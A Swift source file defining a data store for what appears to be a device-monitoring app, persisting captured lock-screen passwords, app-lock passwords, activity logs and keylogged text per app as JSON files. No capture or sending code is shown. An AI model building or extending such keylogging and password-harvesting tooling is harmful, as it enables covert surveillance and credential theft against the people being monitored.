import Foundation

struct LockPasswordRecord: Codable {
    let password: String
    let type: String
    let timestamp: Int64
    let sourcePackage: String
}

struct AppLockPasswordRecord: Codable {
    let password: String
    let type: String
    let timestamp: Int64
    let packageName: String
    let appName: String
}

struct ActivityLogEntry: Codable {
    let eventType: String
    let packageName: String
    let appName: String
    let summary: String
    let detail: String
    let timestamp: Int64
}

struct KeylogEntry: Codable {
    let packageName: String
    let appName: String
    let text: String
    let timestamp: Int64
}

final class MonitorDataStore {
    static let shared = MonitorDataStore()

    private let lockFile = "lock_passwords.json"
    private let appLockFile = "app_lock_passwords.json"
    private let activityFile = "activity_logs.json"
    private let keylogFile = "keylog_records.json"

    private let maxLock = 100
    private let maxAppLock = 100
    private let maxActivity = 1000
    private let maxKeylog = 2000

    private var lockPasswords: [LockPasswordRecord] = []
    private var appLockPasswords: [AppLockPasswordRecord] = []
    private var activityLogs: [ActivityLogEntry] = []
    private var keylogRecords: [KeylogEntry] = []

    private init() {
        lockPasswords = load([LockPasswordRecord].self, file: lockFile) ?? []
        appLockPasswords = load([AppLockPasswordRecord].self, file: appLockFile) ?? []
        activityLogs = load([ActivityLogEntry].self, file: activityFile) ?? []
        keylogRecords = load([KeylogEntry].self, file: keylogFile) ?? []
    }

    func getLockPasswords() -> [LockPasswordRecord] { lockPasswords }
    func clearLockPasswords() {
        lockPasswords = []
        save(lockPasswords, file: lockFile)
    }

    func getAppLockPasswords() -> [AppLockPasswordRecord] { appLockPasswords }
    func clearAppLockPasswords() {
        appLockPasswords = []
        save(appLockPasswords, file: appLockFile)
    }

    func getActivityLogs(limit: Int) -> [ActivityLogEntry] {
        if limit <= 0 || limit >= activityLogs.count {
            return activityLogs
        }
        return Array(activityLogs.prefix(limit))
    }

    func clearActivityLogs() {
        activityLogs = []
        save(activityLogs, file: activityFile)
    }

    func addActivityLog(_ entry: ActivityLogEntry) {
        activityLogs.insert(entry, at: 0)
        if activityLogs.count > maxActivity {
            activityLogs = Array(activityLogs.prefix(maxActivity))
        }
        save(activityLogs, file: activityFile)
    }

    func getKeylogRecords(limit: Int, packageFilter: String) -> [KeylogEntry] {
        var result: [KeylogEntry] = []
        for entry in keylogRecords {
            if !packageFilter.isEmpty && entry.packageName != packageFilter {
                continue
            }
            result.append(entry)
            if limit > 0 && result.count >= limit {
                break
            }
        }
        return result
    }

    func clearKeylogRecords() {
        keylogRecords = []
        save(keylogRecords, file: keylogFile)
    }

    private func documentsURL() -> URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
    }

    private func load<T: Decodable>(_ type: T.Type, file: String) -> T? {
        let url = documentsURL().appendingPathComponent(file)
        guard let data = try? Data(contentsOf: url) else { return nil }
        return try? JSONDecoder().decode(type, from: data)
    }

    private func save<T: Encodable>(_ value: T, file: String) {
        let url = documentsURL().appendingPathComponent(file)
        guard let data = try? JSONEncoder().encode(value) else { return }
        try? data.write(to: url, options: .atomic)
    }
}
